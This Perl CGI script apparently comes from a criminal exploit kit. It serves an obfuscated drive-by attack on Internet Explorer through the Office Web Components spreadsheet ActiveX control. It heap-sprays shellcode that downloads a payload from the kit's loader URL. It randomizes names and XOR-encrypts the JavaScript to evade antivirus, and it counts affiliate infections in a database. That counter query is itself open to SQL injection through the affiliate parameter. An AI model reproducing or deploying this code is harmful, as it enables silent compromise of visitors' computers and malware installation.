#!/usr/bin/perl

#
# var randomizer for MS09_002 exploit (Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0)
# NOT TESTED
# FUD for all AV using random XOR + random Vars + Replace string of eval + fake comment
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit
$sql = "UPDATE exploits SET ms09_043=ms09_043+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET ms09_043=ms09_043+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$xshellcode = JsXOR::generate_random_string(int(rand 100));
$xarray     = JsXOR::generate_random_string(int(rand 100));
$xls        = JsXOR::generate_random_string(int(rand 100));
$xbigblock  = JsXOR::generate_random_string(int(rand 100));
$xlh        = JsXOR::generate_random_string(int(rand 100));
$xi         = JsXOR::generate_random_string(int(rand 100));
$xobj       = JsXOR::generate_random_string(int(rand 100));
$xe         = JsXOR::generate_random_string(int(rand 100));
$xj         = JsXOR::generate_random_string(int(rand 100));

#exec code vars and shellcode
$ret = '%u0c0c%u0c0c';
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=ms09_043';
$shellcode = Shellcode::getshell($urlllll);

#JAVASCRIPT DATA
my $javascript = <<EOF;

var $xshellcode = unescape("$shellcode");
var $xarray = new Array();
var $xls = 0x81000-($xshellcode.length*2);
var $xbigblock = unescape("$ret");

while( $xbigblock.length < $xls / 2) { $xbigblock += $xbigblock; }
var $xlh = $xbigblock.substring(0, $xls / 2);
delete $xbigblock;

for($xi=0; $xi<0x99*2; $xi++) {
$xarray\[$xi] = $xlh + $xlh + $xshellcode;
}

CollectGarbage();
var $xobj = new ActiveXObject("OWC10.Spreadsheet");
$xe = new Array();
$xe.push(1);
$xe.push(2);
$xe.push(0);
$xe.push(window);

for($xi=0; $xi < $xe.length; $xi++){
for($xj=0; $xj<10; $xj++){
try { $xobj.Evaluate($xe\[$xi]); } catch(e) { }
}
window.status = $xe\[3] + '';
for($xj=0; $xj<10; $xj++){
try{ $xobj.msDataSourceObject($xe\[3]); } catch(e) { }
}
}
EOF

#$beforexoredd = JsXOR::excryptxorjs($javascript);
$beforexoredd = EncRand::CsCrypt($javascript,$csname,$theCookie);


###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print '<html>' . "\n";
print '<script language=\'javascript\'>' . "\n";
print $beforexoredd;
print '</script>' . "\n";
print '</html>' . "\n";


####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
